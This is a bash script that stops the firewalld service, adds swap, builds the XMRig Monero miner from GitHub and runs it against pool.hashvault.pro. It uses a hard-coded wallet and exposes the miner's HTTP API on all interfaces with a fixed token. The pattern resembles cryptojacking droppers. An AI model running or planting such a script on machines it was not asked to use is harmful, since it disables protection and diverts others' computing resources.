#!/bin/bash
systemctl stop firewalld.service;
dd if=/dev/zero of=/swapfile bs=4096 count=1024K;
mkswap /swapfile;
swapon /swapfile;
swapon -s;
sudo yum install -y epel-release;
sudo yum install -y git make cmake gcc gcc-c++ libstdc++-static libuv-static hwloc-devel openssl-devel;
git clone https://github.com/xmrig/xmrig.git;
cd xmrig && mkdir build && cd build
cmake .. -DUV_LIBRARY=/usr/lib64/libuv.a;
make;
./xmrig --donate-level 1 --http-enabled --api-worker-id usa --http-host 0.0.0.0 --http-port 11555 --http-access-token chinabjy -o pool.hashvault.pro:443 -u 41xYQJ9xT1jPbyyEUa73trX1HQX22UVKBFsiAJqo2HgDHq9u8zzbpsh3GANLgUCLvThQff514HFUdbWjuYjY4ZYUKZHFuwo -p usa2 -k --tls
